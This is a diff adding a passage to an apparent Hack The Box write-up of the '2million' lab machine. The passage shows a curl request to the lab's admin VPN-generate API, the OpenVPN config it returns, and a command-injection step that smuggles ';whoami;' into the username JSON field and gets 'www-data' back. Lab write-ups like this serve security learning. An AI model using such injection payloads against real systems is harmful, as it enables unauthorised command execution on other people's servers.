@@ -178,7 +178,37 @@ Finally!
 
 
 
+This was done to be able to run the **generate** api, after some of the same progress as above we figure out the correct --data format and so on:
 
+```
+curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data '{"username":"test"}'
+
+client
+dev tun
+proto udp
+remote edge-eu-free-1.2million.htb 1337
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+remote-cert-tls server
+comp-lzo
+verb 3
+data-ciphers-fallback AES-128-CBC
+data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
+tls-cipher "DEFAULT:@SECLEVEL=0"
+auth SHA256
+key-direction 1
+<ca>
+-----BEGIN CERTIFICATE-----
+MIIGADCCA+igAwIBAgIUQxzHkNyCAfHzUuoJgKZwCwVNjgIwDQYJKoZIhvcNAQEL
+BQAwgYgxCzAJBgNVBAYTAlVLMQ8wDQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxv
+bmRvbjETMBEGA1UECgwKSGFja1RoZUJveDEMMAoGA1UECwwDVlBO
+...
+...
+```
+
+Here we can inject terminal commands by adding e.g **;whoami;** to the data field``` curl -v -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=4u5vn9hphqotkiou0p8rhuvedc" --header "Content-Type: application/json" --data '{"username":"test;whoami;"}'``` which returns as: ```www-data``` very good.
 
 
 
